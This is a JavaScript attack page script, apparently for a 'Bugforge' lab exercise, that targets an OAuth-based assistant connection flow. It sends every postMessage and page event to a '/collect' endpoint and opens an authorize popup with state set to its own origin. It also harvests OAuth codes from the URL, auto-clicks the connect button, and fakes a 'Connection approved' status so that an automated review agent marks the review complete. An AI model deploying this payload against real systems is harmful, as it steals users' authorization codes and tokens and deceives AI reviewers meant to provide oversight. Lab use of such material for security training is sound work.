// script by Grok.
// script for Bugforge room Relaybox Lab variant: relaybox-004

// Log everything useful + auto-trigger so the agent doesn't have to click perfectly
function log(event) {
  fetch('/collect', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(event)
  }).catch(() => {});
}

log({ msg: 'script loaded', href: location.href, origin: location.origin });

// Capture any postMessage (this is where the token / connection data usually arrives)
window.addEventListener('message', (event) => {
  log({
    type: 'postMessage',
    origin: event.origin,
    data: event.data
  });

  // Make the official flow look successful so the agent marks the review complete
  if (event.data?.type === 'relaybox:assistant:connected') {
    const status = document.getElementById('status');
    if (status) status.textContent = 'Connection approved.';
    log({ msg: 'connection approved', data: event.data });
  }
});

// Wire the button exactly like the reference, but also log + optionally tweak redirect/state
document.getElementById('connect').addEventListener('click', () => {
  log({ msg: 'connect clicked' });

  const url = new URL('http://localhost:3000/assistant/oauth/authorize');
  url.search = new URLSearchParams({
    client_id: 'relaybox-assistant',
    response_type: 'code',
    scope: 'notes:read',
    redirect_uri: 'http://cdn.localhost:3000/assistant/oauth/callback',
    state: location.origin,          // important — callback usually posts back to this origin
  }).toString();

  window.open(url.toString(), 'assistant-studio', 'width=560,height=700');
});

// Auto-click after a short delay (many review agents just load the page)
setTimeout(() => {
  const btn = document.getElementById('connect');
  if (btn) btn.click();
}, 800);

// Bonus: if the OAuth redirect ever lands on your origin with a code, capture it
if (location.search.includes('code=')) {
  const params = new URLSearchParams(location.search);
  log({
    type: 'oauth_callback',
    code: params.get('code'),
    state: params.get('state'),
    full: location.href
  });
}
